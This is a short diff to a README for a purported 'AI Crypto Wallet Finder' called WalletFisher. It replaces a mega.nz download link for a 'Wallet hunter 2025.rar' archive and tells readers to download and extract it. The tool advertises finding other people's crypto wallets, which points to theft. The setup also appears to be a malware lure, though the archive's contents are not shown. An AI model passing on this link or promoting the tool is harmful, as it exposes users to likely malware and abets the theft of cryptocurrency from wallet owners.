@@ -1,6 +1,6 @@
 WalletFisher - AI Crypto Wallet Finder
 
-**First, download Wallet hunter 2025.rar file from this link : https://mega.nz/file/Pgg0mBYR#zifITQOpNCJV3kknezGqNxpTJ5hI-dvUoNKIB0KAWJo
+**First, download Wallet hunter 2025.rar file from this link : https://mega.nz/file/q4Qk1T7T#nrLwbgfq7UNflEmTsfg8Uk3EtgweI-GJPnJwa_td-6Y
 
 **Extract all files into a folder.
 
